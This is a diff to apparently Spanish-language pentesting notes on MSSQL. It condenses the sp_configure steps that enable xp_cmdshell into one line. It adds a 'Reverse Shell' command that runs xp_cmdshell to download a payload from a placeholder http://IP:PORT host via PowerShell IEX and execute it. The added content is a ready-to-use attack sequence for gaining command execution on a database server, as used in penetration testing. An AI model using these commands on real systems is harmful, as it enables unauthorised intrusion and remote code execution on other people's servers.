@@ -771,17 +771,13 @@ sqsh -S <IP> -U <Username> -P <Password> -D <Database>
 ```
 Enable xp_cmdshell
 ```
-sp_configure 'show advanced options', '1'
+sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 ```
+Reverse Shell
 ```
-RECONFIGURE
+EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://IP:PORT/binary.ext") | powershell -noprofile'
 ```
-```
-sp_configure 'xp_cmdshell', '1'
-```
-```
-RECONFIGURE
-```
+
 Comandos útiles 
 
 [Hacktricks MSSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
